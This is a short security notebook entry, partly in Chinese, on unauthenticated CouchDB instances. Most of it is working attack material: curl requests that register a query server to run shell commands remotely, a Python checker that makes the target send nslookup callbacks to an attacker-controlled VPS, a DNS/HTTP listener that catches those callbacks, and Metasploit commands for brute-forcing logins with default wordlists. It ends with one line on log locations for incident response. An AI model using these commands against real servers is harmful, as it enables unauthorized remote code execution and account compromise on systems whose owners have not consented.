---
title: CouchDB unauthorized access
date: 2016-05-20 00:44:57
tags: unauthorized,CouchDB
---

NMAP:
```
> nmap -Pn -n -v -sV -p 5984 [ip]

```
POC:
```
curl -X PUT 'http://1.1.1.1:5984/_config/query_servers/cmd' -d '"/sbin/ifconfig >/tmp/6666"'
curl -X PUT 'http://1.1.1.1:5984/vultest'
curl -X PUT 'http://1.1.1.1:5984/vultest/vul' -d '{"_id":"770895a97726d5ca6d70a22173005c7b"}'
curl -X POST 'http://1.1.1.1:5984/vultest/_temp_view?limit=11' -d '{"language":"cmd","map":""}' -H 'Content-Type: application/json'
```
> cat /tmp/6666

利用dns记录回显:
```
import urllib2 
import random 
def random_str(len): 
    str1="" 
    for i in range(len): 
        str1+=(random.choice("ABCDEFGH1234567890")) 
    return str(str1) 
def check(url): 
    rand_str = random_str(8) 
    cmd = random_str(4) 
    req_list = [ 
        ["/_config/query_servers/%s"%(cmd),'"nslookup %s [vps ip]>log"'%(rand_str)], 
        ["/vultest123",''], 
        ["/vultest123/test",'{"_id":"safetest"}'] 
    ] 
    for req_info in req_list: 
        try: 
            request = urllib2.Request(url+req_info[0],req_info[1]) 
            request.get_method = lambda: 'PUT' 
            urllib2.urlopen(request) 
        except: 
            pass 
    try: 
        req_exec = urllib2.Request(url + "/vultest123/_temp_view?limit=11",'{"language":"%s","map":""}'%(cmd)) 
        req_exec.add_header("Content-Type","application/json") 
        urllib2.urlopen(req_exec) 
    except: 
        pass 
    check = urllib2.urlopen("http://[vps ip]/%s"%(rand_str)).read() 
    if 'YES' in check: 
        return url,'YES' 
    else: 
        return False 
if __name__ == '__main__': 
    print check("http://www.target.com/")
```
DNS log
```
import socket,thread,datetime 
query_history = [] 
url_history = [] 
def web_server(): 
    web = socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
    web.bind(('0.0.0.0',80)) 
    web.listen(10) 
    while True: 
        try: 
            conn,addr = web.accept() 
            data = conn.recv(4096) 
            req_line = data.split("\r\n")[0] 
            path = req_line.split()[1] 
            route_list = path.split('/') 
            html = "NO" 
            if len(route_list) == 3: 
                if route_list[1] == 'add': 
                    url_history.append(route_list[2]) 
                elif route_list[1] == 'check': 
                    if route_list[2] in url_history: 
                        html = 'YES' 
            else: 
                query_str = route_list[1] 
                for query_raw in query_history: 
                    if query_str in query_raw:html = "YES" 
            print datetime.datetime.now().strftime('%m-%d %H:%M:%S') + ' web query: ' + path 
            raw = "HTTP/1.0 200 OK\r\nContent-Type: application/json; charset=utf-8\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s" %(len(html),html) 
            conn.send(raw) 
            conn.close() 
        except: 
            pass 
if __name__=="__main__": 
    dns = socket.socket(socket.AF_INET,socket.SOCK_DGRAM) 
    dns.bind(('0.0.0.0',53)) 
    thread.start_new_thread(web_server,()) 
    while True: 
        recv,addr = dns.recvfrom(1024) 
        query_history.append(recv) 
        print datetime.datetime.now().strftime('%m-%d %H:%M:%S') + ' Dns Query: ' + recv
```
CouchDB user brute
> msfconsole

```
msf> use auxiliary/scanner/couchdb/couchdb_login
msf> set PASS_FILE /opt/metasploit-framework/embedded/framework/data/wordlists/http_default_pass.txt
msf> set USER_FILE /opt/metasploit-framework/embedded/framework/data/wordlists/http_default_users.txt
msf> set RPORT 5984     #couchdb default port 5984
msf> set VHOST http://www.target.com
msf> set RHOST 10.10.0.10
msf> run

```
### 应急分析：

couchdb default log
```
> /var/log/couchdb/couchdb.log
```
参考:
```
http://drops.wooyun.org/papers/16030
http://zone.wooyun.org/content/27355
```
